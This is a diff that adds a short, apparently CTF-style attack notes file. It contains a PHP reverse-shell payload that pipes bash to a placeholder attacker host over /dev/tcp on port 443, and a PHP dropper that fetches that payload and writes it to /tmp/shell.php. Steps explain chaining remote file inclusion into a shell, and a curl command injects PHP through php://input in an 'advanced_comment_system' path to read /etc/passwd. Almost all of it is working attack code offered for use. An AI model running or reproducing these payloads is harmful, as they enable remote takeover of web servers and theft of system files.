@@ -1,0 +1,14 @@
+evil.txt
+
+<?php
+$output = shell_exec('/bin/bash -i > /dev/tcp/ur ip/443 0<&1 2>&1');
+echo "<pre> $output </pre>";
+echo "script ran";
+?>
+
+back.txt
+<?php $z=fopen('/tmp/shell.php','w'); fwrite($z,file_get_contents('http://ur ip/evil.txt'));fclose($z); ?>
+
+first use rfi on back.txt then load the file in shell.php to get a revserse shell on port 443
+
+curl -s --data "<?system('cat /etc/passwd');?>" "http://ip/internal/advanced_comment_system/index.php?ACS_path=php://input%00"
